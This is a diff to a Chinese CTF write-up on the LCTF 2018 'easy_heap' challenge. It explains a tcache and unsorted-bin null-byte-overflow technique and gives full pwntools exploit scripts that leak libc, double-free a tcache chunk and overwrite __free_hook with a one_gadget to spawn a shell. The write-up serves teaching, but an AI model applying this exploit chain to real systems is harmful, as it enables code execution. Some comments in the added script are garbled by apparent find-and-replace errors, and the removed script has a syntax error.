@@ -1200,7 +1200,23 @@ zj@zj-virtual-machine:~/c_study/lctf2018/easy$ checksec ./easy_heap
 
 ##### 基本功能
 
-程序通过在 heap 上的一块内存( size 为 0xb0 )管理申请的堆块的头地址和我们想要写入堆块的字节数 ，总共可以申请 10 个固定大小为 0x100 的 chunk 来存放我们写入的信息 ，程序具备 show 的功能 ，可以打印堆块中的内容 ，另外程序具备删除堆块功能 ，选择删除 chunk 会先把 chunk 中的内存覆盖成 '\0' ，然后再执行 free 函数 。
+0. 输入函数：循环读入一个字节，如果出现 null 字节或是换行符则停止读入，之后对当前读入的末尾位置和 size 位置进行置零操作。
+1. new: 使用 `malloc(0xa8)` 分配一个块，记录下 size ，输入内容。
+2. free: 首先根据记录下的 size 对堆块进行 `memset` 清零，之后进行常规 free
+3. show：使用 puts 进行输出
+
+功能较为简单。
+
+记录一个 chunk 结构的结构体：
+
+```c
+struct Chunk {
+    char *content;
+    int size;
+};
+```
+
+使用了一个在堆上分配的结构来记录所有 `Chunk` 结构体，一共可以分配 10 个块。
 
 程序的读入输入函数存在一个 null-byte-one 漏洞 ，具体见如下代码
 
@@ -1222,7 +1238,7 @@ unsigned __int64 __fastcall read_input(_BYTE *malloc_p, int sz)
       ++i;
     }
     malloc_p[i] = 0;
-    malloc_p[sz] = 0;                           // null-byte-one
+    malloc_p[sz] = 0;                           // null-byte-overflow
   }
   else
   {
@@ -1234,247 +1250,345 @@ unsigned __int64 __fastcall read_input(_BYTE *malloc_p, int sz)
 
 ##### 利用思路
 
-通常来讲在堆程序中出现 null-byte-one 漏洞 ，都会考虑构造 overlapping heap chunk ，使得 overlapping chunk 可以多次使用 ，达到信息泄露最终劫持控制流的目的 。
+由于存在 tcache ，所以利用过程中需要考虑到 tcache 的存在。
 
-本题没有办法直接更改 prev_size 这一字段为 0x200 0x300 类似的值 ，所以传统上直接在几个 chunks 中间夹一个 chunk 然后 free 掉更高地址的 chunk 触发向低地址合并的方法得到大的 unsortedbin chunk 的方法在此处并不适用 。
+通常来讲在堆程序中出现 null-byte-overflow 漏洞 ，都会考虑构造 overlapping heap chunk ，使得 overlapping chunk 可以多次使用 ，达到信息泄露最终劫持控制流的目的 。
 
-所以如果我们要实现 leak ，我们仍然需要把 main_arena 相关的地址写到一个可以 show 的 chunk 里面 。这里提供一种方法 ，先连续申请 10 个 chunk(size 0x100) ，然后连续释放 7 个 chunk ，刚好可以填满一个 tcache bin 。
+null-byte-overflow 漏洞的利用方法通过溢出覆盖 prev_in_use 字节使得堆块进行合并，然后使用伪造的 prev_size 字段使得合并时造成堆块交叉。但是本题由于输入函数无法输入 NULL 字符，所以无法输入 prev_size 为 0x_00 的值，而堆块分配大小是固定的，所以直接采用 null-byte-overflow 的方法无法进行利用，需要其他方法写入 prev_size 。
 
-然后再连续释放剩下 3 个 chunk ，这 3 个 chunk 便可以进入 unsortedbin ，注意到进入 unsortedbin 的 3 个 chunk 中的第二个 chunk 的 fd ，bk 上的值 ，就会发现把第二个 chunk 作为后面我们要 unlink 掉的 target chunk 是合适的 。
+在没有办法手动写入 prev_size ，但又必须使用 prev_size 才可以进行利用的情况下，考虑使用系统写入的 prev_size 。
 
-单独看上面的思路有点抽象 ，接下来跟着具体的 exp 来理解这个过程 ，就会比较自然 。
+方法为：在 unsorted bin 合并时会写入 prev_size，而该 prev_size 不会被轻易覆盖（除非有新的 prev_size 需要写入），所以可以利用该 prev_size 进行利用。
 
-##### 操作过程
+具体过程：
 
-- exp 的函数定义部分
+1. 将 `A -> B -> C` 三块 unsorted bin chunk 依次进行释放
+2. A 和 B 合并，此时 C 前的 prev_size 写入为 0x200
+3. A  、 B  、 C 合并，步骤 2 中写入的 0x200 依然保持
+4. 利用 unsorted bin 切分，分配出 A 
+5. 利用 unsorted bin 切分，分配出 B，注意此时不要覆盖到之前的 0x200
+6. 将 A 再次释放为 unsorted bin 的堆块，使得 fd 和 bk 为有效链表指针
+7. 此时 C 前的 prev_size 依然为 0x200（未使用到的值），A B C 的情况： `A (free) -> B (allocated) -> C (free)`，如果使得 B 进行溢出，则可以将已分配的 B 块包含在合并后的释放状态 unsorted bin 块中。
 
-```python
-from pwn import *
-local = True
-if local:
-    p = process('./easy_heap') env={'LD_PRELOAD': './libc64.so'})
+但是在这个过程中需要注意 tcache 的影响。
 
-# aggressive alias
-r = lambda x: p.recv(x)
-ru = lambda x: p.recvuntil(x)
-rud = lambda x: p.recvuntil(x, drop=True)
-se = lambda x: p.send(x)
-sel = lambda x: p.sendline(x)
-pick32 = lambda x: u32(x[:4].ljust(4, '\0'))
-pick64 = lambda x: u64(x[:8].ljust(8, '\0'))
-
-libc = ELF('./libc64.so')
-
-def malloc(p, sz, pay):
-    ru('> ')
-    sel(str(1))
-    ru('> ')
-    sel(str(sz))
-    ru('> ')
-    se(pay)
-
-def free(p, idx):
-    ru('> ')
-    sel(str(2))
-    ru('> ')
-    sel(str(idx))
-
-def puts(p, idx):
-    ru('> ')
-    sel(str(3))
-    ru('> ')
-    sel(str(idx))
-```
-
-- 先申请 10 块 chunk ，再全部释放掉
-
-kong1 表示 heap 上数组 arr 存第一个 chunk 信息的位置 **空** 闲出来了 ( 存 chunk 地址的位置值变成 NULL ，存 size 的位置值也为 0 ) ，所以数组 arr 中的一个位置实际上占用的是 0x10 个字节
-
-```python
-    # The 10 chunks for the first application are contiguous. We numbered the chunks for the first application id0 ~ id9 so that we could track them later.
-    # 0~9
-    malloc(p, 248-1, '0'*7+'\n') #0 id0
-    malloc(p, 248-1, '1'*7+'\n') #1 id1
-    malloc(p, 248-1, '2'*7+'\n') #2 id2
-    malloc(p, 248-1, '3'*7+'\n') #3 id3
-    malloc(p, 248-1, '4'*7+'\n') #4 id4
-    malloc(p, 248-1, '5'*7+'\n') #5 id5
-    malloc(p, 248-1, '6'*7+'\n') #6 id6
-    malloc(p, 248-1, '7'*7+'\n') #7 id7
-    malloc(p, 248-1, '8'*7+'\n') #8 id8
-    malloc(p, 248-1, '9'*7+'\n') #9 id9
-    
-    # fill tcache : need 7 chunk
-    free(p, 1) #kong 1
-    free(p, 3) #kong 3
-    free(p, 5) #kong 5
-    free(p, 6) #kong 6
-    free(p, 7) #kong 7
-    free(p, 8) #kong 8
-    free(p, 9) #kong 9
-
-    #place into the unso bk : 0 2 4
-    free(p, 0) #kong 0
-    free(p, 2) #kong 2  other point : place  0x100 in prev_size of id3 chunk
-    free(p, 4) #kong 4
-```
-
-- 经过上述操作后 ，内存布局如下
+##### 利用步骤
  
-```
-#ps : heap part : tcache chunk( size 0x250 ) , next comes the chunk (size 0xb0) that manages subsequent allocations of chunks (id0-id9)
-#ps : look at id0 id2 id4 chunk
-gdb-peda$ x/300xg 0x55e5d0fdf300
-0x55e5d0fdf300:(!!!)0x0000000000000000	    0x0000000000000101    ===> id0
-0x55e5d0fdf310:	 ^  0x00007fa5c2e18ca0	    0x000055e5d0fdf500
-0x55e5d0fdf320:	 |  0x0000000000000000	    0x0000000000000000
-...............  |                           
-0x55e5d0fdf3f0:	 |  0x0000000000000000	    0x0000000000000000    
-0x55e5d0fdf400:	 |  0x0000000000000100	    0x0000000000000100    ===> id1
-0x55e5d0fdf410:	 |  0x0000000000000000	    0x0000000000000000
-...............  |                           
-0x55e5d0fdf4f0:	 |  0x0000000000000000	    0x0000000000000000
-0x55e5d0fdf500:	 +  0x0000000000000000	    0x0000000000000101    ===> id2
-0x55e5d0fdf510: (fd)0x000055e5d0fdf300	(bk)0x000055e5d0fdf700
-...............                           + 
-0x55e5d0fdf600:	    0x0000000000000100	  | 0x0000000000000100    ===> id3 
-0x55e5d0fdf610:	    0x000055e5d0fdf410	  | 0x0000000000000000
-0x55e5d0fdf620:	    0x0000000000000000	  | 0x0000000000000000
-...............                           |
-0x55e5d0fdf700:(!!!)0x0000000000000000<---+ 0x0000000000000101    ===> id4
-0x55e5d0fdf710:	    0x000055e5d0fdf500	    0x00007fa5c2e18ca0
-0x55e5d0fdf720:	    0x0000000000000000	    0x0000000000000000
-...............                             
-0x55e5d0fdf800:	    0x0000000000000100	    0x0000000000000100    ===> id5
-0x55e5d0fdf810:	    0x000055e5d0fdf610	    0x0000000000000000
-0x55e5d0fdf820:	    0x0000000000000000	    0x0000000000000000
-...............                             
-0x55e5d0fdf900:	    0x0000000000000000	    0x0000000000000101    ===> id6
-0x55e5d0fdf910:	    0x000055e5d0fdf810	    0x0000000000000000
-0x55e5d0fdf920:	    0x0000000000000000	    0x0000000000000000
-...............                             
-0x55e5d0fdfa00:	    0x0000000000000000	    0x0000000000000101    ===> id7
-0x55e5d0fdfa10:	    0x000055e5d0fdf910	    0x0000000000000000
-0x55e5d0fdfa20:	    0x0000000000000000	    0x0000000000000000
-...............                             
-0x55e5d0fdfaf0:	    0x0000000000000000	    0x0000000000000000    ===> id8
-0x55e5d0fdfb00:	    0x0000000000000000	    0x0000000000000101
-0x55e5d0fdfb10:	    0x000055e5d0fdfa10	    0x0000000000000000
-...............                             
-0x55e5d0fdfc00:	    0x0000000000000000	    0x0000000000000101    ===> id9
-0x55e5d0fdfc10:	    0x000055e5d0fdfb10	    0x0000000000000000
-0x55e5d0fdfc20:	    0x0000000000000000	    0x0000000000000000
-...............                             
-0x55e5d0fdfd00:	    0x0000000000000000	    0x0000000000020301    ===> top
-0x55e5d0fdfd10:	    0x0000000000000000	    0x0000000000000000
+###### 重排堆块结构，释放出 unsorted bin chunk
 
-# tcache next : id9->id8->id7->id6->id5->id3->id1
-# unsortedbin bk : id0-->id2-->id4
-```
-
-- 再连续申请 7 chunk ，使得后续的 unsortedbin chunk 有机会进入到 tcahce
+由于本题只有 10 个可分配块数量，而整个过程中我们需要用到 3 个 unsorted bin 的 chunk ，加上 7 个 tcache 的 chunk ，所以需要进行一下重排，将一个 tcache 的 chunk 放到 3 个 unsorted bin chunk 和 top chunk 之间，否则会触发 top 的合并。
 
 ```python
-    #get chunk from tcache
-    malloc(p, 240, '\n') #0 id9
-    malloc(p, 240, '\n') #1 id8
-    malloc(p, 240, '\n') #2 id7
-    malloc(p, 240, '\n') #3 id6
-    malloc(p, 240, '\n') #4 id5
-    malloc(p, 240, '\n') #5 id3
-    malloc(p, 240, '\n') #6 id1
-    
-    #get id4 (id 0 2 4 get to tcache , the tcache next : 4->2->0, so get id4 first from tcache)
-    malloc(p, 240, '\n') #7 id4 ：keep the fd_of_id4 = id2
-    #get id2 (fd_of_id2->bk->fd = id2 and bk_of_id2->fd->bk = id2) satisfy the condition that unlink id2
-    malloc(p, 248, '\n') #8 id2 0xf8=248 ===>id3 prev:0x100 size:0x100
-    
-    #now id0 is in tcache , so just need free other 6 chunk to fill the tcache , and the bk_of_id0 = id2
-    free(p, 6)  #kong6   id1
-    free(p, 4)  #kong4   id5
-    free(p, 3)  #kong3   id6
-    free(p, 2)  #kong2   id7
-    free(p, 1)  #kong1   id8
-    free(p, 0)  #kong0   id9
+    # step 1: get three unsortedbin chunks
+    # note that to avoid top consolidation, we need to arrange them like:
+    # tcache * 6 -> unsortd  * 3 -> tcache
+    for i in range(7):
+        new(0x10, str(i) + ' - tcache')
 
-    #if free id3 will place in unsortedbin , and free id3 will find that id2 is freed , so the unlink will happen , merge to id2
-    free(p, 5)  #kong5  id3  unlink id2-->0x200
-    
+    for i in range(3):
+        new(0x10, str(i + 7) + ' - unsorted') # three unsorted bin chunks
+
+    # arrange:
+    for i in range(6):
+        delete(i)
+    delete(9)
+    for i in range(6, 9):
+        delete(i)
 ```
 
-- 经过上述操作后 ，内存布局如下
+重分配后的堆结构：
 
 ```
-gdb-peda$ x/300xg 0x55e5d0fdf300
-0x55e5d0fdf300:	0x0000000000000000	0x0000000000000101    ===>  id0
-0x55e5d0fdf310:	0x0000000000000000	0x000055e5d0fdf700
-0x55e5d0fdf320:	0x0000000000000000	0x0000000000000000
-...............
-0x55e5d0fdf400:	0x0000000000000100	0x0000000000000101    ===>  #6 id1
-0x55e5d0fdf410:	0x000055e5d0fdf310	0x0000000000000000
-0x55e5d0fdf420:	0x0000000000000000	0x0000000000000000
-...............
-0x55e5d0fdf500:	0x0000000000000000	0x0000000000000201    ===>  #8 id2  can leak , becasue the #8 we can show
-0x55e5d0fdf510:	0x00007fa5c2e18ca0	0x00007fa5c2e18ca0
-0x55e5d0fdf520:	0x0000000000000000	0x0000000000000000
-...............
-0x55e5d0fdf600:	0x0000000000000100	0x0000000000000100    ===>  #5 id3
-0x55e5d0fdf610:	0x0000000000000000	0x0000000000000000
-0x55e5d0fdf620:	0x0000000000000000	0x0000000000000000
-...............
-0x55e5d0fdf700:	0x0000000000000200	0x0000000000000100    ===>  #7 id4
-0x55e5d0fdf710:	0x000055e5d0fdf300	0x00007fa5c2e18ca0
-0x55e5d0fdf720:	0x0000000000000000	0x0000000000000000
-...............
-
++-----+
+|     | <-- tcache perthread 结构体
++-----+
+| ... | <-- 6 个 tcache 块
++-----+
+|  A  | <-- 3 个 unsorted bin 块
++-----+
+|  B  |
++-----+
+|  C  |
++-----+
+|     | <-- tcache 块，防止 top 合并
++-----+
+| top |
+|  .. |
 ```
 
-- 信息泄露
+###### 按照解析中的步骤进行 NULL 字节溢出触发
+
+为了触发 NULL 字节溢出，我们需要使得解析中的 B 块可以溢出到 C 块中。由于题目中没有 edit 功能，所以我们需要让 B 块进入 tcache 中，这样就可以在释放后再分配出来，且由于 tcache 没有太多变化和检查，会较为稳定。
 
 ```python
-    #leak the unsortedbin addr
-    puts(p, 8) #show id2
-    unso_addr = pick64(r(6))
-    print "unso_addr @ " + hex(unso_addr)
-    libc_base = unso_addr - (0x00007f94a5acbca0-0x00007f94a56e0000)
-    print "libc_base @ " + hex(libc_base)
-    free_hook = libc_base + (0x7f94a5acd8e8-0x00007f94a56e0000)
-    one_shoot = libc_base + 0x4f322     #execve("/bin/sh", rsp+0x40, environ)
+    for i in range(7):
+        new(0x10, str(i) + ' - tcache')
+
+    # rearrange to take second unsorted bin into tcache chunk, but leave first 
+    # unsorted bin unchanged
+    new(0x10, '7 - first')
+    new(0x10, '8 - second')
+    new(0x10, '9 - third')
+
+    for i in range(6):
+        delete(i)
+    # move second into tcache
+    delete(8)
 ```
 
-- 改写 tcache 的 next ，再分配 chunk ，得到 shell
+之后进行 A 块的释放（用来提供有效的可以进行 unlink 的 fd 和 bk 值）
 
 ```python
-    #get chunk from tcache
-    malloc(p, 240, '\n') #0 id9
-    malloc(p, 240, '\n') #1 id8
-    malloc(p, 240, '\n') #2 id7
-    malloc(p, 240, '\n') #3 id6
-    malloc(p, 240, '\n') #4 id5
-    malloc(p, 240, '\n') #5 id1
-    malloc(p, 240, '\n') #6 id0
+    # delete first to provide valid fd & bk
+    delete(7)
 
-    #cut from the unso , the left of id2_3chunk placed in unso
-    malloc(p, 240, '\n') #9 the id2 of id2_3 tips: #8:id2 , so we can double free tcache chunk
+```
 
-    #placed in tcache
-    free(p, 0) #kong0 id9 just for give a position to malloc
-    free(p, 8) #kong8 id2
-    free(p, 9) #kong9 id2
+现在堆块结构如下：
 
-    #get from tcache
-    malloc(p, 240, p64(free_hook) + '\n') #0 id2
-    malloc(p, 240, '\n') #8 id2
-    malloc(p, 240, p64(one_shoot) + '\n') #9 free_hook_chunk
+```
++-----+
+|     | <-- tcache perthread 结构体
++-----+
+| ... | <-- 6 个 tcache 块 (free)
++-----+
+|  A  | <-- free
++-----+
+|  B  | <-- free 且为 tcache 块
++-----+
+|  C  |
++-----+
+|     | <-- tcache 块，防止 top 合并
++-----+
+| top |
+|  .. |
+```
 
-    #one_shoot triger
-    free(p, 1)  #1 id8
+tcache bin 链表中，第一位的是 B 块，所以现在可以将 B 块进行分配，且进行 NULL 字符溢出。
+
+```python
+    new(0xf8, '0 - overflow')
+```
+
+在之后的步骤中，我们需要 A 处于 unsorted bin 释放状态，B 处于分配状态，C 处于分配状态，且最后可以在 tcache 块 7 个全满的情况下进行释放（触发合并），所以我们需要 7 个 tcache 都被 free 掉。
+
+此时由于 B 块被分配为 tcache 块了，所以需要将防止 top 合并的 tcache 块释放掉。
+
+```python
+    # fill up tcache
+    delete(6)
+```
+
+之后就可以将 C 块释放，进行合并。
+
+```python
+    # trigger
+    delete(9)
+
+```
+
+合并后的结构：
+
+```
++-----+
+|     | <-- tcache perthread 结构体
++-----+
+| ... | <-- 6 个 tcache 块 (free)
++-----+                     --------+
+|  A  | <-- free 大块               |
++-----+                             |
+|  B  | <-- 已分配          --------+--> 一个大 free 块
++-----+                             |
+|  C  | <-- free                    |
++-----+                     --------+
+|     | <-- tcache 块，防止 top 合并 (free)
++-----+
+| top |
+|  .. |
+```
+
+
+###### 地址泄露
+
+此时的堆已经出现交叉了，接下来将 A 大小从 unsorted bin 中分配出来，就可以使得 libc 地址落入 B 中：
+
+```python
+    # step 3: leak, fill up 
+    for i in range(7):
+        new(0x10, str(i) + ' - tcache')
+    new(0x10, '8 - fillup')
+
+    libc_leak = u64(show(0).strip().ljust(8, '\x00'))
+    p.info('libc leak {}'.format(hex(libc_leak)))
+    libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
+    libc.address = libc_leak - 0x3ebca0
+```
+
+堆结构：
+
+```
++-----+
+|     | <-- tcache perthread 结构体
++-----+
+| ... | <-- 6 个 tcache 块 (free)
++-----+
+|  A  | <-- 已分配
++-----+
+|  B  | <-- 已分配          --------+> 一个大 free 块
++-----+                             |
+|  C  | <-- free                    |
++-----+                     --------+
+|     | <-- tcache 块，防止 top 合并 (free)
++-----+
+| top |
+|  .. |
+```
+
+###### tcache UAF attack
+
+接下来，由于 B 块已经是 free 状态，但是又有指针指向，所以我们只需要再次分配，使得有两个指针指向 B 块，之后在 tcache 空间足够时，利用 tcache 进行 double free ，进而通过 UAF 攻击 free hook 即可。
+
+
+```python
+    # step 4: constrecvuntilct UAF, write into __free_hook
+    new(0x10, '9 - next')
+    # these two provides sendlineots for tcache
+    delete(1)
+    delete(2)
+
+    delete(0)
+    delete(9)
+    new(0x10, p64(libc.symbols['__free_hook'])) # 0
+    new(0x10, '/bin/sh\x00into target') # 1
+    one_gadget = libc.address + 0x4f322 
+    new(0x10, p64(one_gadget))
+
+    # system("/bin/sh\x00")
+    delete(1)
+
     p.interactive()
+
 ```
 
-##### Challenge 1 小结
+##### 完整 exploit
 
-尽管作者尽力展示所有的细节 ，发现越要展示更多细节 ，越不容易讲清楚 ，所以最好画图和亲自调试一下 。简单来讲就是在某些限制下如何通过一系列的操作 tcahce chunk 和 unsortedbin 实现 unlink 。
+```python
+#! /usr/bin/env python2
+# -*- coding: utf-8 -*-
+# vim:fenc=utf-8
+#
+import sys
+import os
+import os.path
+from pwn import *
+context(os='linux', arch='amd64', log_level='debug')
+
+p = process('./easy_heap')
+
+def cmd(idx):
+    p.recvuntil('>')
+    p.sendline(str(idx))
+
+
+def new(size, content):
+    cmd(1)
+    p.recvuntil('>')
+    p.sendline(str(size))
+    p.recvuntil('> ')
+    if len(content) >= size:
+        p.send(content)
+    else:
+        p.sendline(content)
+
+
+def delete(idx):
+    cmd(2)
+    p.recvuntil('index \n> ')
+    p.sendline(str(idx))
+
+
+def show(idx):
+    cmd(3)
+    p.recvuntil('> ')
+    p.sendline(str(idx))
+    return p.recvline()[:-1]
+
+
+def main():
+    # Your exploit script goes here
+
+    # step 1: get three unsortedbin chunks
+    # note that to avoid top consolidation, we need to arrange them like:
+    # tcache * 6 -> unsortd  * 3 -> tcache
+    for i in range(7):
+        new(0x10, str(i) + ' - tcache')
+
+    for i in range(3):
+        new(0x10, str(i + 7) + ' - unsorted') # three unsorted bin chunks
+
+    # arrange:
+    for i in range(6):
+        delete(i)
+    delete(9)
+    for i in range(6, 9):
+        delete(i)
+
+    # step 2: use unsorted bin to overflow, and do unlink, trigger consolidation (overecvlineap)
+    for i in range(7):
+        new(0x10, str(i) + ' - tcache')
+
+    # rearrange to take second unsorted bin into tcache chunk, but leave first 
+    # unsorted bin unchanged
+    new(0x10, '7 - first')
+    new(0x10, '8 - second')
+    new(0x10, '9 - third')
+
+    for i in range(6):
+        delete(i)
+    # move second into tcache
+    delete(8)
+    # delete first to provide valid fd & bk
+    delete(7)
+
+    new(0xf8, '0 - overflow')
+    # fill up tcache
+    delete(6)
+
+    # trigger
+    delete(9)
+
+    # step 3: leak, fill up 
+    for i in range(7):
+        new(0x10, str(i) + ' - tcache')
+    new(0x10, '8 - fillup')
+
+    libc_leak = u64(show(0).strip().ljust(8, '\x00'))
+    p.info('libc leak {}'.format(hex(libc_leak)))
+    libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
+    libc.address = libc_leak - 0x3ebca0
+
+    # step 4: constrecvuntilct UAF, write into __free_hook
+    new(0x10, '9 - next')
+    # these two provides sendlineots for tcache
+    delete(1)
+    delete(2)
+
+    delete(0)
+    delete(9)
+    new(0x10, p64(libc.symbols['__free_hook'])) # 0
+    new(0x10, '/bin/sh\x00into target') # 1
+    one_gadget = libc.address + 0x4f322 
+    new(0x10, p64(one_gadget))
+
+    # system("/bin/sh\x00")
+    delete(1)
+
+    p.interactive()
+
+if __name__ == '__main__':
+    main()
+```
+
 
 #### Challenge 2 : HITCON 2018 PWN baby_tcache
 
